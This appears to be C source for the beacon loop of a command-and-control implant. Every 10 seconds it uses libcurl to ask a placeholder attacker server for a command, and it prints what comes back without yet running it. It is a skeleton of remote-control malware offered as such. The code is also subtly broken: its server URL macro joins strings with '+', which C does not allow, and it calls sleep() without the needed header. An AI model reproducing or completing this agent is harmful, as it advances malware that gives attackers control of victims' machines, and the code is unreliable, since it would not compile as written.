#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define SERVERIP "addserver_IP"
#define SERVERPORT "addserver_PORT"
#define SERVER_URL "http://" + SERVERIP + ":" + SERVERPORT + "/command"

// Struct to hold response data from server
struct memory {
    char *response;
    size_t size;
};

// Callback function to write data to memory
static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct memory *mem = (struct memory *)userp;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if(ptr == NULL) {
        printf("Not enough memory to allocate response\n");
        return 0;
    }

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}

// Function to fetch command from server
char* fetch_command() {
    CURL *curl;
    CURLcode res;
    struct memory chunk = {0};

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        res = curl_easy_perform(curl);

        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("Received response: %s\n", chunk.response);
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

    return chunk.response;
}

// Main function for agent
int main() {
    while(1) {
        printf("Checking in with the C2 server...\n");

        // Fetch command from the server
        char* command = fetch_command();

        // For now, simply print the command received
        if (command != NULL) {
            printf("Command received: %s\n", command);
            free(command);
        }

        // Wait 10 seconds before next check-in
        sleep(10);
    }
    return 0;
}
